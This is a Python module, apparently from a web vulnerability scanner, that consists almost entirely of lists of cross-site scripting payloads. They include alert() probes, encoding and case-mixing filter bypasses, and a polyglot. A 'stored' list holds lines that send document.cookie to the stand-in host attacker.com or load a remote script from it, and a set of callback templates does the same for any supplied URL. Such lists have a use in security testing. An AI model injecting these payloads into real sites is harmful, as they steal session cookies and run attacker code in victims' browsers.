"""
XSS payload library — P2 upgrade: 100+ payloads.
"""
from typing import List
import secrets
import string

REFLECTED_PAYLOADS: List[str] = [
    # Basic script tags
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(document.domain)</script>",
    # IMG vectors
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=prompt(1)>",
    "<img src=1 onerror=alert(1)>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    "<img src=x onerror=this.onerror=null;alert(1)>",
    # SVG vectors
    "<svg onload=alert(1)>",
    "<svg onload=alert('XSS')>",
    "<svg onload=prompt(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributeName=x>",
    # Body/iframe
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onfocus=alert(1) autofocus>",
    "<iframe onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    # Input/Autofocus
    "<input onfocus=alert(1) autofocus>",
    "<input onfocus=prompt(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    # Details/Marquee
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<marquee onfinish=alert(1)>",
    # Video/Audio
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video poster=javascript:alert(1)>",
    # Object/Embed
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    # Style / Link
    "<style>@import'javascript:alert(1)';</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    # Event handlers
    "<div onmouseover=alert(1)>",
    "<div onclick=alert(1)>",
    "<form action=javascript:alert(1)><button>click</button></form>",
    "<form><button formaction=javascript:alert(1)>click</button></form>",
    "<a href=javascript:alert(1)>click</a>",
    # Quote breakouts
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
    "\"><svg onload=alert(1)>",
    "';alert(1)//",
    "\";alert(1)//",
    "'>alert(1)</script>",
    # Template literals
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
    "{{7*7}}",
    # Angular/React
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}",
    # DOM clobbering
    "<form id=test><input name=parentNode>",
    # Null byte
    "<script>alert(1)</script>%00",
    "%00<script>alert(1)</script>",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    # Unicode bypass
    "<scrİpt>alert(1)</scrİpt>",
    "<scrİpt>alert(1)</scrİpt>",
    # Mixed case
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRİPT>alert(1)</SCRİPT>",
    "<sCrIpT>alert(1)</sCrIpT>",
    # Without closing tags
    "<script>alert(1)",
    "<img src=x onerror=alert(1)",
    # JS URI schemes
    "javascript:alert(1)",
    "javascript:prompt(1)",
    "javascript:confirm(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    # Expression (IE)
    "expression(alert(1))",
    "x:expression(alert(1))",
    # CSS injection
    "background-image:url(javascript:alert(1))",
    # Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # On-window
    "onwheel=alert(1)",
    "onscroll=alert(1)",
    "onresize=alert(1)",
]

STORED_PAYLOADS: List[str] = [
    "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>",
    "<script src=http://attacker.com/xss.js></script>",
    "<img src=x onerror=\"new Image().src='http://attacker.com/c?'+document.cookie\">",
    "<svg onload=\"fetch('http://attacker.com/?c='+document.cookie)\">",
    "<script>fetch('http://attacker.com/s?'+btoa(document.cookie))</script>",
]

DOM_PAYLOADS: List[str] = [
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "#<svg onload=alert(1)>",
    "#'><script>alert(document.domain)</script>",
    "#javascript:alert(1)",
    "#\" onfocus=alert(1) autofocus ",
    "#' onfocus=alert(1) autofocus ",
]

ENCODED_PAYLOADS: List[str] = [
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
]

WAF_BYPASS_PAYLOADS: List[str] = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scrİpt>alert(1)</scrİpt>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=prompt(1)>",
    "<svg/onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script>confirm(1)</script>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "eval(atob('YWxlcnQoMSk='))",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
]

STORED_XSS_CALLBACK_PAYLOADS: List[str] = [
    "<script src='{callback_url}'></script>",
    "<img src=x onerror=\"var s=document.createElement('script');s.src='{callback_url}';document.body.appendChild(s);\">",
    "<svg onload=\"fetch('{callback_url}?c='+document.cookie)\">",
    "<script>new Image().src='{callback_url}?c='+document.cookie</script>",
]


def generate_stored_xss_marker(length: int = 12) -> str:
    """Generate a unique marker for stored XSS detection."""
    return "WVS_XSS_" + ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(length))
